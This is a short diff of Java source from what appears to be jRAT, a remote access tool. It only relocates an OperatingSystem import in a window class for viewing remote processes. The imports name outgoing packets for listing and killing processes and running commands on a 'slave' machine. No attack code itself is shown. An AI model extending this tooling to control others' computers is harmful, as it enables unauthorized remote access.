@@ -21,13 +21,13 @@ import javax.swing.border.EmptyBorder;
 import javax.swing.table.DefaultTableModel;
 
 import pro.jrat.Slave;
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.packets.outgoing.Packet19ListProcesses;
 import pro.jrat.packets.outgoing.Packet20KillProcess;
 import pro.jrat.packets.outgoing.Packet38RunCommand;
 import pro.jrat.ui.renderers.table.ProcessTableRenderer;
 import pro.jrat.utils.Util;
 
-import com.redpois0n.common.OperatingSystem;
 
 @SuppressWarnings("serial")
 public class FrameRemoteProcess extends JFrame {
